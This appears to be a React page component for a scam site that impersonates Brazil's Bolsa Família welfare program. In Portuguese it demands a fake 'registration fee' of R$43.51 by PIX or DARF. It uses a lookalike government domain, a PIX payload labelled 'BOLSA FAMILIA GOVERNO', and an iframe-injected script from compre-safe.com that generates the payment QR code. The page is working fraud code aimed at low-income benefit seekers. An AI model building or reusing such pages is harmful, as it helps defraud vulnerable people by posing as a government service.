/* eslint-disable @typescript-eslint/no-unused-vars */
import React, { useEffect, useMemo, useRef, useState } from 'react';
import { motion } from 'framer-motion';
import { FileText, RefreshCw, Copy, Check, QrCode, RotateCcw, Loader2, AlertTriangle } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { Header } from '@/components/Header';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Toaster } from '@/components/ui/toaster';

const PixScreen: React.FC = () => {
  const navigate = useNavigate();
  const { toast } = useToast();

  // Estado de exibição e valor
  const [showQR, setShowQR] = useState(false);
  const [copied, setCopied] = useState(false);

  // Estados de carregamento/erro do QR
  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState<string | null>(null);
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const [createdAt, setCreatedAt] = useState<number | null>(null);

  // Refs para controlar a injeção do script
  const containerRef = useRef<HTMLDivElement | null>(null);
  const loadedOnceRef = useRef(false);
  const epochRef = useRef(0);
  const abortTimerRef = useRef<number | null>(null);

  // Dados simulados (em produção virá da API)
  const pixData = {
    // payload de exemplo (será opcionalmente copiado no "copia e cola")
    qrCode:
      '00020126580014BR.GOV.BCB.PIX013636c4b8c5-4c5e-4c5e-8c5e-4c5e4c5e4c5e52040000530398654043.515802BR5925BOLSA FAMILIA GOVERNO6009SAO PAULO62070503***6304A1B2',
    value: 43.51,
  };

  const formattedValue = useMemo(
    () =>
      pixData.value.toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL',
        minimumFractionDigits: 2,
      }),
    [pixData.value]
  );

  const handleDarf = () => navigate('/darf');
  const handleVerifyPayment = () => window.location.reload();

  const copyPix = async () => {
    try {
      await navigator.clipboard.writeText(pixData.qrCode);
      setCopied(true);
      toast({ title: 'Código PIX copiado!', description: 'Cole no seu app de pagamento' });
      setTimeout(() => setCopied(false), 1500);
    } catch (e) {
      toast({ title: 'Erro ao copiar', description: 'Tente novamente', variant: 'destructive' });
    }
  };

  const injectScript = () => {
    const mount = containerRef.current;
    if (!mount) return;

    // Limpa qualquer render anterior
    mount.innerHTML = '';
    setErr(null);
    setLoading(true);

    // cria um iframe isolado para conter o script do provedor (evita modal por cima do app)
    const iframe = document.createElement('iframe');
    iframe.setAttribute('title', 'pix-frame');
    iframe.setAttribute('aria-label', 'QR Code PIX');
    iframe.style.width = '100%';
    iframe.style.height = '100%';
    iframe.style.border = '0';
    iframe.style.display = 'block';
    iframe.style.background = 'transparent';

    mount.appendChild(iframe);

    const doc = iframe.contentDocument || iframe.contentWindow?.document;
    if (!doc) {
      setLoading(false);
      setErr('Não foi possível inicializar o iframe do QR.');
      return;
    }

    // Timeout de segurança
    const timer = window.setTimeout(() => {
      setLoading(false);
      setErr('Tempo esgotado ao gerar o QR. Verifique sua conexão ou permissões (CSP).');
    }, 12000);
    abortTimerRef.current = timer;

    const redirect = 'https://portalbolsafamiliagov.site';
    const code = 'vaf5q2mvgeemxp';

    const html = `
      <!doctype html>
      <html lang="pt-BR">
        <head>
          <meta charset="utf-8"/>
          <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"/>
          <style>
            html,body{height:100%;margin:0;background:transparent;}
            .center{height:100%;display:flex;align-items:center;justify-content:center;padding:4px;}
            /* Garante que qualquer canvas/img/svg do provedor ocupe o espaço corretamente */
            .fit > *{max-width:100% !important; max-height:100% !important; width:100% !important; height:100% !important; object-fit:contain;}
            #m-root{display:flex; align-items:center; justify-content:center; width:100%; height:100%;}
          </style>
        </head>
        <body>
          <div class="center">
            <div class="fit" id="m-root"></div>
          </div>
          <script>
            (function(){
              var s=document.createElement('script');
              s.src='https://compre-safe.com/js/automatic-pix.js';
              s.async=true; s.defer=true;
              s.setAttribute('data-code','${code}');
              s.setAttribute('data-redirect','${redirect}');
              s.onload=function(){ parent && parent.postMessage({type:'PIX_IFRAME_READY'}, '*'); };
              s.onerror=function(){ parent && parent.postMessage({type:'PIX_IFRAME_ERROR'}, '*'); };
              document.body.appendChild(s);
            })();
          </script>
        </body>
      </html>
    `;

    doc.open();
    doc.write(html);
    doc.close();

    // Ouve mensagens do iframe para finalizar estados de loading/erro
    const onMsg = (ev: MessageEvent) => {
      if (!ev || !ev.data || typeof ev.data.type !== 'string') return;
      if (ev.data.type === 'PIX_IFRAME_READY') {
        if (abortTimerRef.current) window.clearTimeout(abortTimerRef.current);
        abortTimerRef.current = null;
        setLoading(false);
        setCreatedAt(Date.now());
      }
      if (ev.data.type === 'PIX_IFRAME_ERROR') {
        if (abortTimerRef.current) window.clearTimeout(abortTimerRef.current);
        abortTimerRef.current = null;
        setLoading(false);
        setErr('Falha ao carregar o script do QR (compre-safe).');
      }
    };
    window.addEventListener('message', onMsg, { once: true });
  };

  // Abre o card e injeta o script uma única vez por "sessão" (epoch)
  const handleGenerateQR = () => {
    setShowQR(true);
    setCreatedAt(null);
  };

  useEffect(() => {
    if (!showQR) return;
    if (loadedOnceRef.current) return;
    loadedOnceRef.current = true;
    injectScript();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [showQR, epochRef.current]);

  useEffect(() => {
    return () => {
      if (abortTimerRef.current) window.clearTimeout(abortTimerRef.current);
    };
  }, []);

  const resetQr = () => {
    loadedOnceRef.current = false;
    epochRef.current += 1;
    if (containerRef.current) containerRef.current.innerHTML = '';
    setErr(null);
    setLoading(false);
    setCreatedAt(null);
    if (showQR) {
      loadedOnceRef.current = true;
      injectScript();
    }
  };

  // UI
  return (
    <div className="min-h-screen bg-slate-900 text-gray-200">
      <Header />

      {/* Banner */}
      <div className="bg-green-600 text-white p-4 shadow-lg mt-16">
        <div className="container mx-auto flex items-center justify-center">
          <div className="text-center">
            <h1 className="text-xl font-bold">Pagamento da Taxa de Cadastro – Cadastro Bolsa Família</h1>
            <p className="text-green-100 mt-2">
              Para concluir seu cadastro e ter acesso ao benefício é necessário efetuar o pagamento da taxa única de {formattedValue}.
            </p>
          </div>
        </div>
      </div>

      <motion.div
        className="flex items-center justify-center min-h-[calc(100vh-120px)] py-8"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.4 }}
      >
        <div className="w-full max-w-2xl mx-auto px-4 space-y-6">
          <Card className="bg-slate-900 border border-slate-800 rounded-2xl shadow-sm">
            <CardContent className="p-6 sm:p-7">
              <div className="grid gap-4">
                <div className="space-y-3">
                  <p className="text-gray-300">
                    A taxa de {formattedValue} corresponde a uma contribuição social obrigatória para a manutenção e processamento
                    administrativo do cadastro no Programa Bolsa Família.
                  </p>
                  <p className="text-gray-300">O pagamento deve ser feito por PIX ou via DARF gerado automaticamente.</p>
                  <p className="text-gray-300">Após o pagamento, o cadastro será confirmado e liberado.</p>
                </div>

                <div className="rounded-xl border border-green-900/40 bg-green-950/40 p-4">
                  <div className="text-3xl font-semibold text-green-400 mb-3">{formattedValue}</div>

                  {!showQR && (
                    <Button
                      onClick={handleGenerateQR}
                      className="w-full bg-green-500/90 hover:bg-green-500 text-white font-semibold py-3 rounded-xl"
                    >
                      <QrCode className="mr-2 h-4 w-4" />
                      Gerar QR Code PIX
                    </Button>
                  )}
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Card do QR – aparece após clicar */}
          {showQR && (
            <motion.div
              initial={{ opacity: 0, y: 18 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.25 }}
              className="flex justify-center"
            >
              <Card className="w-full  bg-slate-900 border border-slate-800 rounded-2xl shadow-sm">
                <CardContent className="p-6 sm:p-7">
                  <div className="grid gap-4 sm:grid-cols-[auto,1fr]">
                    {/* Container controlado do QR (nunca gigante) */}
                    <div className="place-self-center">
                      <div
                        className="relative aspect-square rounded-xl border border-slate-800 bg-slate-800/60 overflow-hidden p-2
                                   [&_canvas]:!w-full [&_canvas]:!h-full [&_canvas]:object-contain
                                   [&_img]:!w-full [&_img]:!h-full [&_img]:object-contain
                                   [&_svg]:!w-full [&_svg]:!h-full [&_svg]:object-contain"
                        style={{ width: '260px' }}
                      >
                        <div ref={containerRef} className="w-full h-full flex items-center justify-center" />
                        {loading && (
                          <div className="absolute inset-0 flex items-center justify-center">
                            <div className="flex items-center gap-2 text-gray-200">
                              <Loader2 className="w-4 h-4 animate-spin" />
                              <span className="text-sm">Gerando QR…</span>
                            </div>
                          </div>
                        )}
                      </div>

                      {err && (
                        <div className="mt-2 text-xs flex items-center gap-2 text-amber-400">
                          <AlertTriangle className="w-4 h-4" />
                          {err}
                        </div>
                      )}

                      <div className="mt-2 flex items-center justify-center gap-2">
                        <Button
                          onClick={resetQr}
                          variant="outline"
                          className="text-xs border-slate-700 hover:bg-slate-800"
                        >
                          <RotateCcw className="w-3 h-3 mr-2" />
                          Tentar novamente
                        </Button>
                      </div>

                      <div className="mt-2 text-center text-xs text-gray-400">
                        Aponte a câmera do app do seu banco para pagar
                      </div>
                    </div>

                    {/* Lado direito: valor + copia e cola */}
                    <div className="space-y-3">
                      <div>
                        <div className="text-xs text-gray-400">Valor</div>
                        <div className="text-lg font-semibold text-gray-200">{formattedValue}</div>
                      </div>

                      <div className="space-y-2">
                        <p className="text-xs text-gray-400 font-medium">Código PIX (Copia e Cola)</p>
                        <div className="rounded-lg border border-slate-800 bg-slate-900 p-3">
                          <p className="text-[11px] text-gray-200 font-mono break-all leading-relaxed">{pixData.qrCode}</p>
                        </div>
                        <Button onClick={copyPix} variant="outline" className="w-full">
                          {copied ? (
                            <>
                              <Check className="mr-2" size={16} />
                              Copiado!
                            </>
                          ) : (
                            <>
                              <Copy className="mr-2" size={16} />
                              Copiar Código PIX
                            </>
                          )}
                        </Button>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </motion.div>
          )}

          <div className="flex flex-col sm:flex-row gap-4 justify-center pt-6">
            <Button onClick={handleDarf} className="bg-indigo-500/90 hover:bg-indigo-500 px-6 py-3 rounded-xl shadow-sm">
              <FileText className="mr-2" size={20} />
              Gerar DARF
            </Button>
            <Button onClick={handleVerifyPayment} className="bg-indigo-500/90 hover:bg-indigo-500 px-6 py-3 rounded-xl shadow-sm">
              <RefreshCw className="mr-2" size={20} />
              Verificar Pagamento
            </Button>
          </div>
        </div>
      </motion.div>
      <Toaster />
    </div>
  );
};

export default PixScreen;